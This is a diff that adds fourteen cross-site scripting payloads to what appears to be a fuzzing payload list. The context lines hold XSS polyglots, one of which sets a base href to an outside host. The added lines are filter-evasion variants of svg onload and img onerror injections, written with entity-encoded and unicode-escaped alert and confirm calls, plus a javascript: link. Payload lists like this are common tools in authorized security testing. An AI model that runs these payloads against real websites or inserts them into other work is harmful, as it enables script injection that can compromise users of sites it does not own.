@@ -2,3 +2,17 @@
 1//%0Aalert?.(/Hunted/)//'/*\'/*"/*\"/*`/*\`/*&apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*S4/*/;{/8/(alert)(/Hunted/)}//>
 JavaScript://%250Aalert?.(/Hunted/)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/<Style/</Script/</textArea/</iFrame/<noScript>\74k<K/contentEditable/autofocus/OnFocus=/*${/*/;{/**/(alert)(/Hunted/)}//>
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+<svg/onload=confirm`1`>
+<svg/onload=\u0061lert(1)>
+<img src=hhttttpp onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
+<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
+<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>click</a>
+<svg onload=setTimeout`\u0061\u006c\u0065\u0072\u0074(1)`>
+<svg/onload=confirm(1)>
+<svg onload="throw 1">
+<svg onload="confirm`${1}`">
+<svg onload="confirm`XSS`">
+<svg onload="throw'XSS'">
+<svg onload="console.log`XSS executed`">
+<svg/onload=\u0063onfirm(1)>
+<svg onload=confirm`${1}`>
